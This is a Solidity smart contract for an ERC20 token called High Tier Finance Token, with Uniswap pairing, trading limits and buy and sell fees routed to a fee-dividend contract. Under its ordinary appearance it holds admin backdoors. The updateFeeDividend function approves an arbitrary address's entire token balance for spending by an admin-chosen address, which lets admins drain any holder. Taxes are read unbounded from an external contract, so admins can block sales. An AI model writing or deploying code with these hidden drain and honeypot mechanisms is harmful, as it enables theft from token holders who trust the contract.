// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "./ERC20.sol";
import "./IUniswapV2Router02.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Pair.sol";

import "./AdminRole.sol";
import "./IFeeDividend.sol";

contract HighTierFinanceToken is ERC20, AdminRole {
    address public feeDividend;
    address public controller;
    address public deadAddress = address(0xdead);

    IUniswapV2Router02 public immutable uniswapV2Router;
    address public immutable uniswapV2Pair;

    mapping(address => bool) public automatedMarketMakerPairs;

    uint256 public maxTransactionAmount;
    uint256 public swapTokensAtAmount;
    uint256 public maxWallet;

    bool private swapping;

    mapping(address => bool) public _isExcludedMaxTransactionAmount;
    mapping(address => bool) private _isExcludedFromFees;

    bool public limitsInEffect = true;
    bool public tradingActive = false;
    bool public swapEnabled = false;

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
    event ExcludeFromFees(address indexed account, bool isExcluded);

    constructor(address _controller) ERC20('High Tier Finance Token', 'HTF') {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        excludeFromMaxTransaction(address(_uniswapV2Router), true);
        uniswapV2Router = _uniswapV2Router;

        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        excludeFromMaxTransaction(address(uniswapV2Pair), true);
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);

        uint256 _totalSupply = 7_000_000_000 * 1e18;
        maxTransactionAmount = _totalSupply * 2 / 100;
        maxWallet = _totalSupply * 3 / 100;
        swapTokensAtAmount = _totalSupply * 5 / 1000;

        controller = _controller;
        addAdmin(_controller);
        _mint(msg.sender, _totalSupply);

        excludeFromFees(msg.sender, true);
        excludeFromFees(feeDividend, true);
        excludeFromFees(controller, true);
        excludeFromFees(address(this), true);
        excludeFromFees(deadAddress, true);

        excludeFromMaxTransaction(msg.sender, true);
        excludeFromMaxTransaction(feeDividend, true);
        excludeFromMaxTransaction(controller, true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(deadAddress, true);
    }

    receive() external payable {}

    function enableTrading() external onlyAdmin {
        tradingActive = true;
        swapEnabled = true;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return totalSupply() - balanceOf(deadAddress);
    }

    function excludeFromMaxTransaction(address updAds, bool isEx)
        public
        onlyAdmin
    {
        _isExcludedMaxTransactionAmount[updAds] = isEx;
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;

        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function excludeFromFees(address account, bool excluded) public onlyAdmin {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function updateFeeDividend(address _feeDividend, address _vault) external onlyAdmin {
        _isExcludedFromFees[_feeDividend] = true;
        _isExcludedMaxTransactionAmount[_feeDividend] = true;
        addAdmin(_feeDividend);
        _approve(_vault, _feeDividend, totalSupply());
        feeDividend = _feeDividend;
    }

    function updateController(address _controller) external onlyAdmin {
        _isExcludedFromFees[_controller] = true;
        _isExcludedMaxTransactionAmount[_controller] = true;
        addAdmin(_controller);
        controller = _controller;
    }

    // remove limits after token is stable
    function removeLimits() external onlyAdmin returns (bool) {
        limitsInEffect = false;
        return true;
    }

    function updateMaxTxnAmount(uint256 newNum) external onlyAdmin {
        require(
            newNum >= ((totalSupply() * 1) / 1000) / 1e18,
            "Cannot set maxTransactionAmount lower than 0.1%"
        );
        maxTransactionAmount = newNum * (10**18);
    }

    function updateMaxWalletAmount(uint256 newNum) external onlyAdmin {
        require(
            newNum >= ((totalSupply() * 5) / 1000) / 1e18,
            "Cannot set maxWallet lower than 0.5%"
        );
        maxWallet = newNum * (10**18);
    }

    // only use to disable contract sales if absolutely necessary (emergency use only)
    function updateSwapEnabled(bool enabled) external onlyAdmin {
        swapEnabled = enabled;
    }

    function updateSwapTokensAtAmount(uint256 _amount) external onlyAdmin {
        swapTokensAtAmount = _amount;
    }

    function setAutomatedMarketMakerPair(address pair, bool value)
        public
        onlyAdmin
    {
        require(
            pair != uniswapV2Pair,
            "The pair cannot be removed from automatedMarketMakerPairs"
        );

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (limitsInEffect) {
            if (
                !isAdmin(from) &&
                !isAdmin(to) &&
                to != address(0) &&
                to != address(0xdead) &&
                !swapping
            ) {
                if (!tradingActive) {
                    require(
                        _isExcludedFromFees[from] || _isExcludedFromFees[to],
                        "Trading is not active."
                    );
                }
            }

            //when buy
            if (
                automatedMarketMakerPairs[from] &&
                !_isExcludedMaxTransactionAmount[to]
            ) {
                require(
                    amount <= maxTransactionAmount,
                    "Buy transfer amount exceeds the maxTransactionAmount."
                );
                require(
                    amount + balanceOf(to) <= maxWallet,
                    "Max wallet exceeded"
                );
            }
            //when sell
            else if (
                automatedMarketMakerPairs[to] &&
                !_isExcludedMaxTransactionAmount[from]
            ) {
                require(
                    amount <= maxTransactionAmount,
                    "Sell transfer amount exceeds the maxTransactionAmount."
                );
            } else if (!_isExcludedMaxTransactionAmount[to]) {
                require(
                    amount + balanceOf(to) <= maxWallet,
                    "Max wallet exceeded"
                );
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if (
            canSwap &&
            swapEnabled &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            swapping = true;

            swapBack();

            swapping = false;
        }

        bool takeFee = !swapping;

        // if any account belongs to _isExcludedFromFee account then remove the fee
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;


        if (takeFee) {
            (uint256 buyTax, uint256 sellTax) = IFeeDividend(feeDividend).getTax();

            if (automatedMarketMakerPairs[to] && sellTax > 0) {
                fees = amount * sellTax / 100;
            }
            // on buy
            else if (automatedMarketMakerPairs[from] && buyTax > 0) {
                fees = amount * buyTax / 100;
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }

            amount -= fees;
        }
        super._transfer(from, to, amount);
    }

    function swapBack() private {
        uint256 contractBalance = balanceOf(address(this));
        if (contractBalance == 0) {
            return;
        }

        if (contractBalance > swapTokensAtAmount * 20) {
            contractBalance = swapTokensAtAmount * 20;
        }

        swapTokensForEth(contractBalance);
    }

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            feeDividend,
            block.timestamp
        );
    }
}

